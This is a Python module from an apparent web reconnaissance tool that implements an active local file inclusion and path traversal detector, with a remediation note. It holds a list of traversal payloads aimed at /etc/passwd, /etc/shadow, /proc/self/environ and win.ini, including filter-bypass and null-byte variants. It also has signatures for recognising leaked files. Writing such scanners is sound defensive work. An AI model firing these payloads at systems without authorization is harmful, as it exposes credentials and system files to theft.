"""Local File Inclusion (LFI) / Path Traversal detector.

Probes crawled endpoints with path traversal payloads and detects whether
system file contents appear in the response. Covers:

  * Unix: ../../../etc/passwd, ....//....//....//etc/passwd
  * Windows: ..\\..\\..\\windows\\win.ini
  * Null-byte suffix (legacy PHP): ../../../etc/passwd%00
  * Filter bypass: ....//....//....//etc/passwd

Detection is content-based: looks for known file signatures (passwd format,
win.ini format) in the response body. Verifies findings with a second
payload to reduce false positives.
"""
from __future__ import annotations

import asyncio
import re
from typing import Any
from urllib.parse import quote

from openrecon.collectors.base import Collector, register
from openrecon.core.graph import AttackSurfaceGraph
from openrecon.core.models import (
    CollectorResult, Finding, Node, NodeType, ScanMode, Severity
)

# Path traversal payloads targeting common sensitive files.
LFI_PROBES: list[tuple[str, str]] = [
    ("../../../etc/passwd", "unix_passwd"),
    ("....//....//....//etc/passwd", "unix_passwd"),
    ("..\\..\\..\\windows\\win.ini", "windows_winini"),
    ("../../../etc/passwd%00", "unix_passwd"),
    ("....//....//....//etc/shadow", "unix_shadow"),
    ("../../../../proc/self/environ", "proc_environ"),
]

# Verification payloads: different traversal to confirm real LFI.
LFI_VERIFY_PROBES: list[tuple[str, str]] = [
    ("....//....//....//....//....//etc/passwd", "unix_passwd"),
    ("..\\..\\..\\..\\..\\windows\\win.ini", "windows_winini"),
]

# Signatures that indicate a file was successfully read.
_FILE_SIGNATURES: list[tuple[str, str]] = [
    (r"root:\w?:0:0", "unix_passwd"),
    (r"\[fonts\]", "windows_winini"),
    (r"\[extensions\]", "windows_winini"),
    (r"\[files\]", "windows_winini"),
    (r"daemon:\w?:\d+:\d+", "unix_passwd"),
]


def contains_file_content(response_body: str) -> tuple[bool, str | None]:
    """Return (True, file_type) if response body matches known file content signatures."""
    if not response_body:
        return False, None
    for pattern, file_type in _FILE_SIGNATURES:
        if re.search(pattern, response_body):
            return True, file_type
    return False, None


def _is_real_file_leak(body: str, file_type: str) -> bool:
    """Check if the file content appears in a real leak context, not page content."""
    if file_type == "unix_passwd":
        # Real passwd files have multiple lines with colon-separated fields.
        lines = [l for l in body.splitlines() if ":" in l and l.count(":") >= 6]
        return len(lines) >= 2
    if file_type == "windows_winini":
        # Real win.ini has section headers.
        return bool(re.search(r"\[(?:fonts|extensions|files)\]", body, re.IGNORECASE))
    return True


@register
class LfiDetector(Collector):
    """Detect LFI/path traversal by injecting traversal payloads into parameters.

    Targets crawled API/REST nodes with query parameters. For each parameter,
    injects path traversal payloads and checks if system file contents appear
    in the response. Read-only: only reads files, never writes.
    """
    name = "lfi"
    stage = "attack"
    mode = ScanMode.ACTIVE
    description = "Detect Local File Inclusion (LFI) / path traversal via parameter probing"

    async def collect(self, graph: AttackSurfaceGraph) -> CollectorResult:
        result = CollectorResult()
        targets = self._targets(graph)
        if not targets:
            result.errors.append("lfi: no crawled endpoints with parameters to probe")
            return result

        sem = asyncio.Semaphore(max(1, self.config.concurrency // 2))
        tasks = [self._probe_endpoint(sem, graph, target, result) for target in targets]
        await asyncio.gather(*tasks)
        result.stats["lfi_targets"] = len(targets)
        result.stats["lfi_findings"] = len(result.findings)
        return result

    def _targets(self, graph: AttackSurfaceGraph) -> list[dict[str, Any]]:
        """Find crawled API/REST endpoints with query parameters."""
        targets = []
        for n in graph.nodes_of(NodeType.API):
            if n.attrs.get("kind") not in ("rest", "api-root"):
                continue
            params = n.attrs.get("query_params", [])
            if not params:
                from urllib.parse import urlparse, parse_qs
                try:
                    qs = parse_qs(urlparse(n.attrs.get("url", "")).query)
                    params = list(qs.keys())
                except ValueError:
                    pass
            if params:
                targets.append({
                    "url": n.attrs.get("url", ""),
                    "host": n.attrs.get("host", ""),
                    "path": n.attrs.get("path", ""),
                    "params": params,
                    "node_id": n.id,
                })
        return targets

    async def _probe_endpoint(self, sem: asyncio.Semaphore, graph: AttackSurfaceGraph,
                              target: dict[str, Any], result: CollectorResult) -> None:
        async with sem:
            url = target["url"]
            host = target["host"]
            for param in target["params"]:
                for payload, file_type in LFI_PROBES:
                    encoded = quote(payload, safe="")
                    probe_url = f"{url}{'&' if '?' in url else '?'}{param}={encoded}"
                    resp = await self.http.request("GET", probe_url, retries=0)
                    if resp is None or resp.status_code >= 500:
                        continue
                    body = resp.text or ""
                    found, detected_type = contains_file_content(body)
                    if found and _is_real_file_leak(body, detected_type or file_type):
                        # Verification: try a different traversal pattern
                        verified = await self._verify_lfi(url, param, file_type)
                        host_id = Node.make_id(
                            NodeType.DOMAIN if host == graph.meta.target else NodeType.SUBDOMAIN,
                            host
                        )
                        result.findings.append(Finding(
                            title=f"LFI via parameter '{param}' at {host}{target['path']}",
                            severity=Severity.HIGH if verified else Severity.MEDIUM,
                            category="lfi",
                            node_ids=[target["node_id"], host_id],
                            description=(
                                f"Parameter '{param}' at {host}{target['path']} appears to "
                                f"include local file contents when given a path traversal "
                                f"payload. An attacker can read arbitrary files on the server."
                                f"{' Verified with secondary test.' if verified else ''}"
                            ),
                            evidence={"url": probe_url, "payload": payload,
                                      "file_type": file_type, "param": param},
                            remediation=(
                                "Never use user input directly in file paths. Use an allow-list "
                                "of permitted files, or map user input to internal identifiers."
                            ),
                            collector=self.name,
                        ))
                        return

    async def _verify_lfi(self, url: str, param: str, file_type: str) -> bool:
        """Verify LFI with a different traversal pattern to reduce false positives."""
        for payload, verify_type in LFI_VERIFY_PROBES:
            if verify_type != file_type:
                continue
            encoded = quote(payload, safe="")
            probe_url = f"{url}{'&' if '?' in url else '?'}{param}={encoded}"
            resp = await self.http.request("GET", probe_url, retries=0)
            if resp is None or resp.status_code >= 500:
                continue
            body = resp.text or ""
            found, detected_type = contains_file_content(body)
            if found and _is_real_file_leak(body, detected_type or verify_type):
                return True
        return False
